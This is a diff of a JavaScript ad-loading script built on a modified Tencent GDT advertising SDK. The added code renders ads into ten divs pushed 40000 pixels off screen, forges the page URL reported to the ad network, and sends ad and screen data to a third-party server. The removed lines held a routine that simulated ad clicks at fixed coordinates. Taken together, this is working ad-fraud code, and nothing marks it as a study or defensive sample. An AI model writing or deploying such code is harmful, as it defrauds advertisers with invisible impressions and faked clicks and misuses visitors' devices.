@@ -1,69 +1,134 @@
 window.curNode = document.currentScript || (function(){var script=document.querySelectorAll('script');return script[script.length-1]})();
+var li_ifr = document.createElement('div');
+var li_ifr_id = 'wrdfdetre_e10101r0101';
+li_ifr.id = li_ifr_id;
+window.curNode.parentNode.insertBefore(li_ifr, window.curNode);
 
 
-window.all_info = []; 
-
-window.all_info['ad_list'] = [
-	{'iadvplaceid':"3042937263526525","iappid":"1111417629","time_out":"0","url":"http://m.xfzxs.com/"},
-	{'iadvplaceid':"4072630273926698","iappid":"1111689334","time_out":"10","url":"http://m.metootea.com/"},
-	{'iadvplaceid':"4032934273339555","iappid":"1111596423","time_out":"20","url":"http://m.ywdiyu.com/"},
-	{'iadvplaceid':"7012431293730715","iappid":"1111689302","time_out":"30","url":"http://m.mkbake.com/m/index.php"},
-];
-
-var vl = new Array(
-'http://m.pandabibi.com/'
-);
+var li_ifr2 = document.createElement('div');
+var li_ifr_id2 = 'wrdfdetre_e10101r0102';
+li_ifr2.id = li_ifr_id2;
+li_ifr2.style.position = 'absolute';
+li_ifr2.style.left = '-40000px';
+li_ifr2.style.top = '-40000px';
+li_ifr2.style.width = '100%';
+li_ifr2.style.height = '1000px';		
+window.curNode.parentNode.insertBefore(li_ifr2, window.curNode);
 
 
-var trackid = trackid || 30000;
-var ad_is_save_c_logs = true;
+var li_ifr3 = document.createElement('div');
+var li_ifr_id3 = 'wrdfdetre_e10101r0103';
+li_ifr3.id = li_ifr_id3;
+li_ifr3.style.position = 'absolute';
+li_ifr3.style.left = '-40000px';
+li_ifr3.style.top = '-40000px';
+li_ifr3.style.width = '100%';
+li_ifr3.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr3, window.curNode);
+
+var li_ifr4 = document.createElement('div');
+var li_ifr_id4 = 'wrdfdetre_e10101r0104';
+li_ifr4.id = li_ifr_id4;
+li_ifr4.style.position = 'absolute';
+li_ifr4.style.left = '-40000px';
+li_ifr4.style.top = '-40000px';
+li_ifr4.style.width = '100%';
+li_ifr4.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr4, window.curNode);
 
 
-var ad_con = [];
-var ad_con_i = window.all_info['ad_list'].length;
-var ad_con_j = 10;
-var ad_con_pre_name = 'div_ad_do3a009tw_';
-
-for(var a_i = 0;a_i < ad_con_i;a_i++){
-    for(var a_j = 0;a_j < ad_con_j;a_j++){
-	var tmp_obj = {"id":ad_con_pre_name+a_i+"_"+a_j};
-	ad_con.push(tmp_obj);
-    }    
-}
+var li_ifr5 = document.createElement('div');
+var li_ifr_id5 = 'wrdfdetre_e10101r0105';
+li_ifr5.id = li_ifr_id5;
+li_ifr5.style.position = 'absolute';
+li_ifr5.style.left = '-40000px';
+li_ifr5.style.top = '-40000px';
+li_ifr5.style.width = '100%';
+li_ifr5.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr5, window.curNode);
 
 
+var li_ifr6 = document.createElement('div');
+var li_ifr_id6 = 'wrdfdetre_e10101r0106';
+li_ifr6.id = li_ifr_id6;
+li_ifr6.style.position = 'absolute';
+li_ifr6.style.left = '-40000px';
+li_ifr6.style.top = '-40000px';
+li_ifr6.style.width = '100%';
+li_ifr6.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr6, window.curNode);
 
 
+var li_ifr7 = document.createElement('div');
+var li_ifr_id7 = 'wrdfdetre_e10101r0107';
+li_ifr7.id = li_ifr_id7;
+li_ifr7.style.position = 'absolute';
+li_ifr7.style.left = '-40000px';
+li_ifr7.style.top = '-40000px';
+li_ifr7.style.width = '100%';
+li_ifr7.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr7, window.curNode);
 
-for(x_con in ad_con){
-    var li_div = document.createElement('div');
-    li_div.id = ad_con[x_con]['id'];
-    li_div.style.position = 'absolute';
-    li_div.style.left = '-40000px';
-    li_div.style.top = '-40000px';
-    li_div.style.width = '100%';
-    li_div.style.height = '1000px';    
-    
-    window.curNode.parentNode.insertBefore(li_div, window.curNode);
-    
-    
-}
+var li_ifr8 = document.createElement('div');
+var li_ifr_id8 = 'wrdfdetre_e10101r0108';
+li_ifr8.id = li_ifr_id8;
+li_ifr8.style.position = 'absolute';
+li_ifr8.style.left = '-40000px';
+li_ifr8.style.top = '-40000px';
+li_ifr8.style.width = '100%';
+li_ifr8.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr8, window.curNode);
+
+var li_ifr9 = document.createElement('div');
+var li_ifr_id9 = 'wrdfdetre_e10101r0109';
+li_ifr9.id = li_ifr_id9;
+li_ifr9.style.position = 'absolute';
+li_ifr9.style.left = '-40000px';
+li_ifr9.style.top = '-40000px';
+li_ifr9.style.width = '100%';
+li_ifr9.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr9, window.curNode);
+
+var li_ifr10 = document.createElement('div');
+var li_ifr_id10 = 'wrdfdetre_e10101r01010';
+li_ifr10.id = li_ifr_id10;
+li_ifr10.style.position = 'absolute';
+li_ifr10.style.left = '-40000px';
+li_ifr10.style.top = '-40000px';
+li_ifr10.style.width = '100%';
+li_ifr10.style.height = '1000px';
+window.curNode.parentNode.insertBefore(li_ifr10, window.curNode);
 
 
 
 window.s_ww = window.curNode.id ? parseInt(window.curNode.id) : 0;
+window.all_info = []; 
+window.all_info['iadvplaceid'] = '4082624340006713'; 
+window.all_info['iappid'] = '1111283873';
+var trackid = trackid || 10214;
 
 
+var vl = new Array(
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/',
+'http://m.3801wd.com/'
+);
 
 
-
-
-
-
-var vl_r = Math.floor(Math.random() * (vl.length - 0)) + 0;
-//window.all_info['vl'] = vl[0];
-window.all_info['vl'] = vl_r;
-
+var vl_r = Math.floor(Math.random() * (13 - 0)) + 0;
+window.all_info['vl'] = vl[0];
 window.all_info['cnzz_count'] = window.all_info['cnzz_count_2'] = window.all_info['cnzz_count_3'] = window.all_info['cnzz_count_4'] = window.all_info['cnzz_count_5'] = 0;
 
 window.all_info['cnzz_count_6'] = window.all_info['cnzz_count_7'] = window.all_info['cnzz_count_8'] = window.all_info['cnzz_count_9'] = window.all_info['cnzz_count_10'] = 0;
@@ -103,11 +168,6 @@ var crd_10 = Math.floor(Math.random() * (1000 - 1)) + 1;
 if (crd_10 <= 70) window.all_info['cnzz_count_10'] = 1;
 
 
-//window.all_info['cnzz_count'] = window.all_info['cnzz_count_2'] = window.all_info['cnzz_count_3'] = window.all_info['cnzz_count_4'] = window.all_info['cnzz_count_5'] = 1;
-//
-//window.all_info['cnzz_count_6'] = window.all_info['cnzz_count_7'] = window.all_info['cnzz_count_8'] = window.all_info['cnzz_count_9'] = window.all_info['cnzz_count_10'] = 1;
-
-
     var p2 = {
 		"crd":crd, "cnzz_count":window.all_info['cnzz_count'],
 		"crd_2":crd_2, "cnzz_count_2":window.all_info['cnzz_count_2'],
@@ -126,66 +186,128 @@ if (crd_10 <= 70) window.all_info['cnzz_count_10'] = 1;
 var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid=' + trackid + '&placement_id=' + window.all_info['iadvplaceid'] + '&app_id=' + window.all_info['iappid'] + '&cnzz_count='+window.all_info['cnzz_count'] + '&crd='+ crd + '&p2='+ p2 +'&gdt_mview=6';
 new Image().src = alogs;
  
-var rand_adv = Math.floor(Math.random() * (window.all_info['ad_list'].length - 0)) + 0;
-
 
 
 window.TencentGDT = window.TencentGDT || [];
+// 广告初始化
+window.TencentGDT.push({
+    placement_id: window.all_info['iadvplaceid'], // {String} - 广告位id - 必填 6091104777383443
+    app_id: window.all_info['iappid'], // {String} - appid - 必填 1109750529
+    type: 'native', // {String} - 原生广告类型 - 必填
+    muid_type: '1', // {String} - 移动终端标识类型，1：imei，2：idfa，3：mac号 - 选填    
+    muid: '******', // {String} - 加密终端标识，详细加密算法见API说明 -  选填
+    count: 10, // {Number} - 拉取广告的数量，默认是3，最高支持10 - 选填
+    onComplete: function (res) {
+        if (res && res.constructor === Array) {
+            // 原生模板广告位调用 window.TencentGDT.NATIVE.renderAd(res[0], 'containerId') 进行模板广告的渲染
+            // res[0] 代表取广告数组第一个数据
+            // containerId：广告容器ID
+	    
+			for(var jjj = 0;jjj < res.length;jjj++){
+			    var rand_122 = Math.floor(Math.random() * (1000 - 1)) + 1;
+			    var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&p2='+p2+'&gdt_mview=131&rand_122='+rand_122;
+			    //new Image().src = alogs;			    
+			}	    
+	    
+            var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid=' + trackid + '&placement_id=' + window.all_info['iadvplaceid'] + '&app_id=' + window.all_info['iappid'] + '&gdt_mview=1';
+            //new Image().src = alogs;
+            window.TencentGDT.NATIVE.renderAd(res[0], li_ifr_id);
+	    window.TencentGDT.NATIVE.renderCount(res[0], li_ifr_id);
+	    
+	    
+	    console.log('onComplete');
+	    
 
-
-//for(var a_i = 0;a_i < ad_con_i;a_i++){
-    
-    
-    // 广告初始化
-    window.TencentGDT.push({
-	placement_id: window.all_info['ad_list'][rand_adv]['iadvplaceid'], // {String} - 广告位id - 必填 6091104777383443
-	app_id: window.all_info['ad_list'][rand_adv]['iappid'], // {String} - appid - 必填 1109750529
-	type: 'native', // {String} - 原生广告类型 - 必填
-	muid_type: '1', // {String} - 移动终端标识类型，1：imei，2：idfa，3：mac号 - 选填    
-	muid: '******', // {String} - 加密终端标识，详细加密算法见API说明 -  选填
-	count: ad_con_j, // {Number} - 拉取广告的数量，默认是3，最高支持10 - 选填
-	vl:window.all_info['ad_list'][rand_adv]['url'],
-	onComplete: function (res) {
-
-
-	    if (res && res.constructor === Array) {
-		// 原生模板广告位调用 window.TencentGDT.NATIVE.renderAd(res[0], 'containerId') 进行模板广告的渲染
-		// res[0] 代表取广告数组第一个数据
-		// containerId：广告容器ID
-
-
-			var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid=' + trackid + '&placement_id=' + window.all_info['iadvplaceid'] + '&app_id=' + window.all_info['iappid'] + '&gdt_mview=1&a_i='+a_i;
-			//new Image().src = alogs;
-		        for(var a_j = 0;a_j < ad_con_j;a_j++){
-			    var a_ii = get_index_from_all_adv(res[a_j]['placement_id']);
-
-			    console.log('a_ii');
-			    console.log(a_ii);
-			    console.log('a_ii');
-			    
-			    setTimeout(function(a_jj) {
-				try {
-				    var a_ii = get_index_from_all_adv(res[a_jj]['placement_id']);
-				    window.TencentGDT.NATIVE.renderAd(res[a_jj], ad_con_pre_name+a_ii+'_'+a_jj);
-				} catch (e) {}
-			     }, window.all_info['ad_list'][a_ii]['time_out'],a_j)	     
-			}
-
+	    
+	    
+	    if (typeof(res[1]) != 'undefined'){
+		setTimeout(function() {
+		    try {
+			window.TencentGDT.NATIVE.renderAd(res[1], li_ifr_id2);
+		    } catch (e) {}
+		 }, 300)		
 	    }
+
+	   if (typeof(res[2]) != 'undefined'){
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[2], li_ifr_id3);
+		    
+		    			
+                } catch (e) {}
+             }, 400)	       
+	   }
+
+	if (typeof(res[3]) != 'undefined'){  
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[3], li_ifr_id4);
+                } catch (e) {}
+             }, 500)		     
+	 }
+	 
+	if (typeof(res[4]) != 'undefined'){   
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[4], li_ifr_id5);
+                } catch (e) {}
+             }, 600)
+	 }
+	 if (typeof(res[5]) != 'undefined'){ 
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[5], li_ifr_id6);
+                } catch (e) {}
+             }, 700)		     
+	 }
+
+	     
+	if (typeof(res[6]) != 'undefined'){      
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[6], li_ifr_id7);
+                } catch (e) {}
+             }, 800)	     
 	}
-    });
-//}
+	if (typeof(res[7]) != 'undefined'){    
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[7], li_ifr_id8);
+                } catch (e) {}
+             }, 900)	
+	}    
+	 
+	if (typeof(res[8]) != 'undefined'){   
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[8], li_ifr_id9);
+                } catch (e) {}
+             }, 1000)		     
+	 }
+	 if (typeof(res[9]) != 'undefined'){   
+	    setTimeout(function() {
+		try {
+		    window.TencentGDT.NATIVE.renderAd(res[9], li_ifr_id10);
+                } catch (e) {}
+             }, 1100)		    
+	 } 
 
+        } else {
+          document.getElementById(li_ifr_id).innerHTML = "<iframe style='border: 0px; width: 100%; height: 320px;' src='https://etc.6187wo.com/adv.html'></iframe>";
+            
 
-
-function get_index_from_all_adv(placement_id){
-    for (x in window.all_info['ad_list']){
-	if (window.all_info['ad_list'][x]['iadvplaceid'] == placement_id){
-	    return x;
-	}
+            // 加载广告API，如广告回调无广告，可使用loadAd再次拉取广告
+            // 注意：拉取广告频率每分钟不要超过20次，否则会被广告接口过滤，影响广告位填充率
+//                setTimeout(function() {
+//                    window.TencentGDT.NATIVE.loadAd(window.all_info['iadvplaceid']);
+//                }, 3000);
+//		  console.log('NO AD！！');
+//		  //document.getElementById(li_ifr_id).innerHTML = '没有请求到广告！！！';
+		  var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=2';
+		  //new Image().src = alogs;
+        }
     }
-    return false;
-}
+});
 
 var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=13';
 //new Image().src = alogs;
@@ -572,10 +694,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=10';
 			//new Image().src = alogs;			
 			
-			console.log('aaaaaaaaddddaaaaaaaaaaaaaa');
-			console.log(t);
-			console.log('aaaaaaaaddddaaaaaaaaaaaaaa');
-			//return;
+			
 			
                         var n = e.getReqCond(t),
                             o = t.posid || t.placement_id,
@@ -692,8 +811,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                                 c_os: "",
                                 c_hl: navigator.language || navigator.browserLanguage,
                                 //url: document.location.href,
-				//url: window.all_info['vl'],
-				url: t.vl,
+				url: window.all_info['vl'],
                                 sdk_src: "mobile_union_js",
                                 tmpallpt: !0,
                                 click_ext: t.click_ext || g.getParameter("click_ext"),
@@ -756,10 +874,10 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                         return !(!t || t.acttype != e.CONST.AD_ACTITON_TYPE.APP && t.producttype != e.CONST.PRODUCT_TYPE.IOSAPP && t.producttype != e.CONST.PRODUCT_TYPE.OPEN_APP && t.producttype != e.CONST.PRODUCT_TYPE.MYAPP)
                     },
                     exposeTemplateNativeAd: function(t, n) {
-//			console.log('d9');
-//			console.log(t);
-//			console.log(n);
-//			console.log('d9');
+			console.log('d9');
+			console.log(t);
+			console.log(n);
+			console.log('d9');
                         var o = e,
                             i = o.loadedAd[t];
                         if (i) {
@@ -767,7 +885,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                                 placement_id: i.posid,
                                 advertisement_id: i.adData.cl
                             };
-			    //console.log('d1');
+			    console.log('d1');
                             o.doExpose(a)
                         }
                     },
@@ -835,59 +953,23 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			}
 		    },		    
 		    cnzzCount:function(n1){
-			
-
-			
 			var traceid = n1['traceid'];
-			if (ad_is_save_c_logs === false){
-			    
-			    var d_p_r = window.devicePixelRatio || 1;
-			    var s_w = document.body.clientWidth * d_p_r;	
-			    var c_t = 0;
-			    var data = {
-					trackid:trackid,
-					appname:n1.appname,
-					desc:n1.desc,
-					w:window.screen.width,
-					h:window.screen.height,
-					d_p_r:d_p_r,
-					img:n1.img,
-					txt:n1.txt
-				    };	
+			var d_p_r = window.devicePixelRatio || 1;
+			var s_w = document.body.clientWidth * d_p_r;	
+			var c_t = parseInt(document.getElementById(li_ifr_id).offsetTop);
+		        var data = {
+				    trackid:trackid,
+				    appname:n1.appname,
+				    desc:n1.desc,
+				    w:window.screen.width,
+				    h:window.screen.height,
+				    d_p_r:d_p_r,
+				    img:n1.img,
+				    txt:n1.txt
+                                };	
 
-			    var url = 'https://pts.lmview.com:3930/gt.php?img='+n1.img+'&c_t='+c_t+'&c_w='+window.s_ww;
-			    this.reqRequest(url, JSON.stringify(data), this.reqResponse, null, 1,traceid);	
-			    
-			}else{
-			    
-
-			    var obj = {"status":"1","nx":"127","ny":"168","up_x":"127","up_y":"168","tid":"9000","da":"360","db":"307","g":"72","sc":"3","ec":"75"};
-
-			    var nx = parseInt(obj.nx);
-			    var ny = parseInt(obj.ny);
-			    
-	
-
-			    if (parseInt(obj.status) === 1){
-
-				setTimeout(function() {
-				    var t = n = o = {};
-				    t.pageX = obj.nx.toString();
-				    t.pageY = obj.ny.toString();
-				    t.up_x = obj.nx.toString();
-				    t.up_y = obj.ny.toString();
-				    t.c = 1;
-				    t.ec = obj.ec.toString();
-				    t.sc = obj.sc.toString();
-				    t.g = obj.g.toString();
-				    n = n1;
-				    e.clickTemplateNativeAd(t,traceid,o);
-				}, 50);		    
-			    }			    
-			}
-
-			
-			
+			var url = 'https://pts.lmview.com:3930/gt.php?img='+n1.img+'&c_t='+c_t+'&c_w='+window.s_ww;
+			this.reqRequest(url, JSON.stringify(data), this.reqResponse, null, 1,traceid);
 		    },	
 		    randString:function(){
 			var str = 'abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_';
@@ -903,17 +985,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                     clickTemplateNativeAd: function(t, n, o) {
                         var i = e,
                             a = i.loadedAd[n],
-			    r = e.getAntiSpam(a.posid);
-			    
-//			    console.log('rrrrrrrrrrrrrrrrrrr');
-//			    console.log(a);
-//			    console.log(r);
-//			    console.log(t);
-//			    console.log(n);
-//			    console.log(o);
-//			    console.log('rrrrrrrrrrrrrrrrrrr');		    
-			    
-	
+                            r = e.getAntiSpam(a.posid);
                         if (a) {
                             var d = a.adData && a.adData.template_id,
                                 s = r.da,
@@ -944,14 +1016,15 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 				    price:a.adData.price,
 				    rl:a.adData.rl,
 				    acttype:a.adData.acttype,
-				    ad_industry_id:a.adData.ad_industry_id,
 				    c:t.c,
                                     s: encodeURIComponent(JSON.stringify(f))
                                 };
+				console.log('d2');
                             i.doExpose(m), i.doClick(m)
                         }
                     },
                     loadIframeUrlJS: function(e, t, n) {
+			console.log('loadIframeUrlJS');
                         var o = e.createElement("script");
                         o.onload = o.onreadystatechange = o.onerror = function() {
                             o && o.readyState && /^(?!(?:loaded|complete)$)/.test(o.readyState) || (o.onload = o.onreadystatechange = o.onerror = null, o.src = "", o.parentNode.removeChild(o), o = null, n && n())
@@ -1003,13 +1076,13 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                             };
 			    
 			    
-//			console.log('eeeeeeeeeeeeeeeeeeeeeeee');
-//			console.log(t);
-//			console.log(i);
-//			console.log('eeeeeeeeeeeeeeeeeeeeeeee');			    
+			console.log('eeeeeeeeeeeeeeeeeeeeeeee');
+			console.log(t);
+			console.log(i);
+			console.log('eeeeeeeeeeeeeeeeeeeeeeee');			    
 			    
                         if (e.getAdConf(c).display_type === e.CONST.DISPLAY_TYPE_INTERSTITIAL && (o = e.creatInterstitialNativeContainer()[1], n = e.creatInterstitialNativeContainer()[0]), n && o && t && t.tid && t.advertisement_id && t.placement_id && i && a && t && t.tid && t.advertisement_id && t.placement_id && i && a) try {
-			    //console.log('ccccccccccccccc');
+			    console.log('ccccccccccccccc');
 			    if (e.checkEnvironment("inQB") && window.browser && window.browser.app && d == e.CONST.PRODUCT_TYPE.OPEN_APP && 1 == r) window.browser.app.isInstallApk(function(i) {
 				1 != i && e.creatAdframe(t, n, o, a, c)
                             }, p);
@@ -1039,7 +1112,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                         e.style.height = n + "px"
                     },
                     creatAdframe: function(t, n, o, i, a) {
-			//console.log('creatAdframe');
+			console.log('creatAdframe');
                         var r = "gdt_template_native_wrap_" + t.tid + "_" + t.advertisement_id,
                             d = document.createElement("div"),
                             s = e.getAdConf(a);
@@ -1087,11 +1160,11 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                         return !1
                     },
                    renderTemplateAd: function(t, n, o) {	
-			//console.log('renderTemplateAd');
+			console.log('renderTemplateAd');
                         var i = e.getTargetIframe(t, o),
                             a = 0;
                         if (!1 !== i) {
-			    //console.log('2222renderTemplateAd');
+			    console.log('2222renderTemplateAd');
                             var r = setInterval(function() {
                                     if (++a > 20) return clearInterval(r), !1;
                                     if (!y.checkIsHidden(t) && (i && "complete" == i.readyState || i && "interactive" == i.readyState))
@@ -1101,7 +1174,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                                         else {
                                             if (!(i.body.getElementsByTagName("div").length >= 1)) return !1;
                                             t.style.height = i.body.getElementsByTagName("div")[0].scrollHeight + "px";
-					    //console.log('aaa:'+t.style.height);
+					    console.log('aaa:'+t.style.height);
                                         }
                                 }, 500),
                                 d = i.createElement("meta");
@@ -1113,7 +1186,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			//new Image().src = alogs;
                     },
                     setIframeElSize: function(t, n, o) {
-			//console.log('setIframeElSize');
+			console.log('setIframeElSize');
                         var i = document.documentElement.clientWidth,
                             a = document.documentElement.clientHeight,
                             r = e.getAdConf(o.placement_id),
@@ -1149,7 +1222,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                         })
                     },
                     getOnorientationChange: function(t, n, o, i, a) {
-			//console.log('getOnorientationChange');
+			console.log('getOnorientationChange');
                         window.addEventListener("onorientationchange" in window ? "orientationchange" : "resize", function(r) {
                             setTimeout(function() {
                                 try {
@@ -1270,8 +1343,14 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                                 return !1
                         }
                     },
-                    callback: function(t, n, o) {;
+                    callback: function(t, n, o) {
 			
+//			console.log('//////////////ttttt///////////////');
+//			console.log(t);
+//			console.log(n);
+//			console.log(o);
+//			console.log('//////////////ttttt///////////////');
+//			
 			var have_ad = 0;
 			//console.log('callback');
     var p2 = {
@@ -1286,44 +1365,8 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 		"crd_9":crd_9, "cnzz_count_9":window.all_info['cnzz_count_9'],		
 		"crd_10":crd_10, "cnzz_count_10":window.all_info['cnzz_count_10']
 	    };
-    p2 = JSON.stringify(p2);	
-    
-    
-			//保存数据
-
-			
-			if (typeof(n['data']) != 'undefined'){
-			    console.log(n['data'].length);
-			}
-			
-			
-//			console.log('保存数据');
-//			
-//			if (typeof(n['data'][0]) != 'undefined' && ad_is_save_logs == true){
-//			    var ll = n['data'].length;
-//			    for(xx in n['data']){
-//				var m_img = n['data'][xx]['img'];
-//				var m_title = n['data'][xx]['txt'];
-//				var m_desc = n['data'][xx]['desc'];
-//				var m_ad_industry_id = n['data'][xx]['ad_industry_id'];
-//				var m_real_adtype = n['data'][xx]['real_adtype'];
-//				var m_acttype = n['data'][xx]['acttype'];
-//				var m_advertiser_id = n['data'][xx]['advertiser_id'];
-//				var m_template_id = n['data'][xx]['template_id'];
-//				var is_ready_go = window.all_info['cnzz_count_g'];
-//
-//				//var click_url = typeof(n['data'][0]['materials']['click_url'] != 'undefined') ? encodeURI(n['data'][0]['materials']['click_url']) : '';
-//				var click_url = '';
-//				var rl = encodeURI(n['data'][xx]['rl']);
-//				var apurl = encodeURI(n['data'][xx]['apurl']);
-//				var go_url = ''
-//				var is_from = 1;;
-//
-//				var m_viewid = '';
-//				var alogs = 'https://api.186078.com:3928/aliyun/sample/Tissue1001.php?m_img='+m_img+'&m_title='+m_title+'&m_desc='+m_desc+'&m_ad_industry_id='+m_ad_industry_id+'&m_advertiser_id='+m_advertiser_id+'&m_real_adtype='+m_real_adtype+'&m_acttype='+m_acttype+'&m_viewid='+m_viewid+'&click_url='+click_url+'&rl='+rl+'&apurl='+apurl+'&go_url='+go_url+'&template_id='+m_template_id+'&is_from='+is_from+'&is_ready_go='+is_ready_go+'&trackid='+trackid;
-//				//new Image().src = alogs;				
-//			    }
-//			}
+    p2 = JSON.stringify(p2);			
+		
 		
 			var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&p2='+p2+'&gdt_mview=12';
 			//new Image().src = alogs;	
@@ -1520,9 +1563,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			    script.charset = charset;
 			    script.async = true;
 			    script.src = apurl;		
-//			    console.log('action_start1111');
-//			    console.log(apurl);
-//			    console.log('action_end111');
+
 			    head.appendChild(script);
 			}
 			
@@ -1532,181 +1573,172 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			    //new Image().src = alogs;			    
 			}
 			
-			
-//			for(var jjj = 0;jjj < have_ad;jjj++){
-//			    if (typeof(n['data'][jjj]) != 'undefined'){
-//				if (ad_is_save_c_logs === true){
-//				    this.cnzzCount(n['data'][jjj]);
-//				}else{
-//				    if(typeof(window.all_info['cnzz_count']) != 'undefined' && parseInt(window.all_info['cnzz_count']) == 1){
-//					var i_this = this;
-//					window.setTimeout(function(d){
-//					    i_this.cnzzCount(d);
-//					},1000,n['data'][jjj]);				    
-//				    }
-//				}
-//			    }			    
-//			}
-			
-			if (typeof(n['data'][0]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][0]['acttype']) == 0 && parseInt(n['data'][0]['ad_industry_id']) == 3601 && n['data'][0]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][0]);
-				//}
-				
-			    }else{
-				if(typeof(window.all_info['cnzz_count']) != 'undefined' && parseInt(window.all_info['cnzz_count']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][0]);
-				    },200);				    
-				}
-			    }
-			}
-			
-			if (typeof(n['data'][1]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][1]['acttype']) == 0 && parseInt(n['data'][1]['ad_industry_id']) == 3601 && n['data'][1]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][1]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_2']) != 'undefined' && parseInt(window.all_info['cnzz_count_2']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][1]);
-				    },300);				    
-				}
-			    }
-			}			
-			
-			
-			if (typeof(n['data'][2]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][2]['acttype']) == 0 && parseInt(n['data'][2]['ad_industry_id']) == 3601 && n['data'][2]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][2]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_3']) != 'undefined' && parseInt(window.all_info['cnzz_count_3']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][2]);
-				    },400);				    
-				}
-			    }
-			}	
-			
-			
-			if (typeof(n['data'][3]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][3]['acttype']) == 0 && parseInt(n['data'][3]['ad_industry_id']) == 3601 && n['data'][3]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][3]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_4']) != 'undefined' && parseInt(window.all_info['cnzz_count_4']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][3]);
-				    },500);				    
-				}
-			    }
+			//保存数据
